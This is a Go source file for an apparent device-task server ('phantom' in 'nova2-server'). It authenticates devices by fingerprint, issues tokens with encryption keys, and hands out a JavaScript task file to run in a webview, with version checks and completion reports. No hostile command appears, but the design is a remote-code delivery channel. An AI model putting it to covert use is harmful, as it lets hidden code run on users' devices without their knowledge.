package phantom

import (
	"encoding/json"

	"nova2-server/internal/model"
	"nova2-server/internal/store"
)

type Service struct {
	devices *store.DeviceRepo
	tokens  *store.TokenRepo
	plugins *store.PluginRepo
}

func NewService(devices *store.DeviceRepo, tokens *store.TokenRepo, plugins *store.PluginRepo) *Service {
	return &Service{devices: devices, tokens: tokens, plugins: plugins}
}

// GetToken handles device authentication and returns a new token with encryption key.
func (s *Service) GetToken(req model.DeviceAuthRequest) (*model.TokenResponse, error) {
	// Upsert device
	if err := s.devices.UpsertFromFingerprint(req.Atom); err != nil {
		return nil, err
	}

	// Create token + encryption key
	token, _, err := s.tokens.CreateToken(req.DeviceID, req.AppID)
	if err != nil {
		return nil, err
	}

	return &model.TokenResponse{
		Code:    0,
		Message: "ok",
		Content: token,
	}, nil
}

// GetTask returns the current task configuration for the device.
func (s *Service) GetTask(req model.DeviceAuthRequest) (*model.TaskResponse, error) {
	if err := s.devices.UpsertFromFingerprint(req.Atom); err != nil {
		return nil, err
	}

	content, _, err := s.plugins.GetTaskFile()
	if err != nil {
		return nil, err
	}

	// Task content is a JSON string containing the JS task config
	taskConfig := map[string]interface{}{
		"task_type":   "webview",
		"js_url":      "",
		"js_content":  content,
		"config":      map[string]interface{}{},
	}
	taskJSON, _ := json.Marshal(taskConfig)

	return &model.TaskResponse{
		Code:    0,
		Message: "ok",
		Task:    string(taskJSON),
	}, nil
}

// GetFileVersion returns the current version of the JS task file.
func (s *Service) GetFileVersion(req model.DeviceAuthRequest) (*model.FileVersionResponse, error) {
	if err := s.devices.UpsertFromFingerprint(req.Atom); err != nil {
		return nil, err
	}

	_, version, err := s.plugins.GetTaskFile()
	if err != nil {
		return nil, err
	}

	return &model.FileVersionResponse{
		Code:    0,
		Message: "ok",
		Version: version,
	}, nil
}

// GetFileContent returns the JS file content.
func (s *Service) GetFileContent(req model.DeviceAuthRequest) (*model.FileContentResponse, error) {
	if err := s.devices.UpsertFromFingerprint(req.Atom); err != nil {
		return nil, err
	}

	content, _, err := s.plugins.GetTaskFile()
	if err != nil {
		return nil, err
	}

	return &model.FileContentResponse{
		Code:    0,
		Message: "ok",
		Content: content,
	}, nil
}

// ReportDone processes a task completion report.
func (s *Service) ReportDone(req model.DoneRequest) error {
	return s.devices.UpsertFromFingerprint(req.Atom)
}
